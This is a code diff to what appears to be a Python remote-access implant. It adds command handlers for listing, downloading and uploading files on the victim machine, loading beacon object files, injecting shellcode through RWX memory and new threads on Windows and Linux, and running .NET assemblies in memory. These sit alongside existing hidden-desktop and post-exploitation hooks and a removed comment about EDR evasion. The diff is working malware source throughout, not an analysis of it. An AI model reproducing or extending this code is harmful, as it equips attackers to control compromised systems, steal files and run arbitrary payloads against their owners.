@@ -94,18 +94,164 @@ def get_metadata():
     }
 
 
+def _handle_fs(command: str) -> str:
+    if command.startswith('__fs:ls:'):
+        path = command[8:] or '.'
+        try:
+            entries = []
+            for name in os.listdir(path):
+                full = os.path.join(path, name)
+                try:
+                    st = os.stat(full)
+                    prefix = 'd' if os.path.isdir(full) else '-'
+                    entries.append(f"{prefix} {st.st_size:>12}  {name}")
+                except OSError:
+                    entries.append(f"? {'?':>12}  {name}")
+            return '\n'.join(entries) if entries else 'Directory is empty'
+        except Exception as e:
+            return f"Error: {e}"
+    if command.startswith('__fs:get:'):
+        path = command[9:]
+        if not os.path.isfile(path):
+            return 'Error: not a file'
+        if os.path.getsize(path) > 2 * 1024 * 1024:
+            return 'Error: file too large (>2MB)'
+        return 'FILE:' + base64.b64encode(open(path, 'rb').read()).decode()
+    if command.startswith('__fs:put:'):
+        rest = command[9:]
+        path, _, b64 = rest.partition('\t')
+        data = base64.b64decode(b64)
+        parent = os.path.dirname(path)
+        if parent:
+            os.makedirs(parent, exist_ok=True)
+        with open(path, 'wb') as f:
+            f.write(data)
+        return f'uploaded {len(data)} bytes to {path}'
+    return 'Error: unknown fs command'
+
+
+def _handle_bof(command: str) -> str:
+    parts = command.split(':', 3)
+    if len(parts) < 4:
+        return 'Error: invalid BOF format (expected __bof:entry:args_b64:bof_data)'
+    entry = parts[1]
+    args_b64 = parts[2]
+    bof_b64 = parts[3]
+    try:
+        bof_data = base64.b64decode(bof_b64)
+        args_data = base64.b64decode(args_b64) if args_b64 else b''
+    except Exception as e:
+        return f'Error: base64 decode failed: {e}'
+    if sys.platform != 'win32':
+        return f'BOF received: {len(bof_data)} bytes, entry={entry}, args={len(args_data)} bytes (not Windows, skipping execution)'
+    try:
+        import ctypes, tempfile
+        tmp = tempfile.NamedTemporaryFile(suffix='.bin', delete=False)
+        tmp.write(bof_data)
+        tmp.close()
+        try:
+            lib = ctypes.CDLL(tmp.name)
+            func = getattr(lib, entry, None)
+            if func:
+                func()
+                result = f'BOF executed: entry={entry}, size={len(bof_data)} bytes'
+            else:
+                result = f'BOF loaded but entry "{entry}" not found (available: COFF object)'
+        except OSError as e:
+            result = f'BOF load error (expected for raw COFF): {e}'
+        finally:
+            os.unlink(tmp.name)
+        return result
+    except Exception as e:
+        return f'BOF error: {e}'
+
+
+def _handle_shinject(command: str) -> str:
+    import ctypes, threading
+    sc_b64 = command.split(':', 1)[1] if ':' in command else ''
+    try:
+        sc = base64.b64decode(sc_b64)
+    except Exception as e:
+        return f'Error: base64 decode failed: {e}'
+    if not sc:
+        return 'Error: empty shellcode'
+    try:
+        if sys.platform == 'win32':
+            k32 = ctypes.windll.kernel32
+            ptr = k32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
+            if not ptr:
+                return 'Error: VirtualAlloc failed'
+            ctypes.memmove(ptr, sc, len(sc))
+            ht = k32.CreateThread(0, 0, ptr, 0, 0, 0)
+            if not ht:
+                return 'Error: CreateThread failed'
+            return f'Shellcode injected: {len(sc)} bytes, thread handle={ht}'
+        else:
+            import mmap
+            mm = mmap.mmap(-1, len(sc), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
+            mm.write(sc)
+            cfunc = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(mm)))
+            t = threading.Thread(target=cfunc)
+            t.daemon = True
+            t.start()
+            return f'Shellcode injected: {len(sc)} bytes (Linux/mmap)'
+    except Exception as e:
+        return f'Shellcode injection error: {e}'
+
+
+def _handle_asm(command: str) -> str:
+    if sys.platform != 'win32':
+        return 'Error: execute-assembly is Windows-only'
+    parts = command.split(':', 2)
+    args_str = parts[1] if len(parts) > 1 else ''
+    asm_b64 = parts[2] if len(parts) > 2 else ''
+    try:
+        asm_data = base64.b64decode(asm_b64)
+    except Exception as e:
+        return f'Error: base64 decode failed: {e}'
+    if not asm_data:
+        return 'Error: empty assembly'
+    try:
+        import clr
+        import System
+        from System.Reflection import Assembly
+        asm_bytes = System.Array[System.Byte](asm_data)
+        assembly = Assembly.Load(asm_bytes)
+        entry = assembly.EntryPoint
+        if not entry:
+            return 'Error: assembly has no entry point'
+        argv = args_str.split() if args_str else []
+        params = entry.GetParameters()
+        if len(params) == 1:
+            args_array = System.Array[System.String](argv)
+            result = entry.Invoke(None, System.Array[System.Object]([args_array]))
+        else:
+            result = entry.Invoke(None, None)
+        return f'Assembly executed: {result}' if result else 'Assembly executed (no output)'
+    except ImportError:
+        return f'Error: execute-assembly requires pythonnet (clr module). Assembly received: {len(asm_data)} bytes'
+    except Exception as e:
+        return f'Assembly execution error: {e}'
+
+
 def execute_command(command: str) -> str:
     if str(command).startswith('__hd:'):
         return hidden_desktop(command)
     if str(command).startswith('__px:'):
         return postex(command)
-    """Execute system command with EDR evasion"""
+    if str(command).startswith('__fs:'):
+        return _handle_fs(command)
+    if str(command).startswith('__bof:'):
+        return _handle_bof(command)
+    if str(command).startswith('__shinject:'):
+        return _handle_shinject(command)
+    if str(command).startswith('__asm:'):
+        return _handle_asm(command)
     try:
         if command.startswith('cd '):
             directory = command[3:].strip()
             os.chdir(directory)
             return f"Changed directory to {os.getcwd()}"
-
         if sys.platform == 'win32':
             CREATE_NO_WINDOW = 0x08000000
             parts = command.split()
@@ -122,10 +268,8 @@ def execute_command(command: str) -> str:
         else:
             result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                      timeout=30, cwd=os.getcwd())
-
         output = result.stdout + result.stderr
         return output if output else "Command executed successfully (no output)"
-
     except subprocess.TimeoutExpired:
         return "Command timeout"
     except Exception as e:
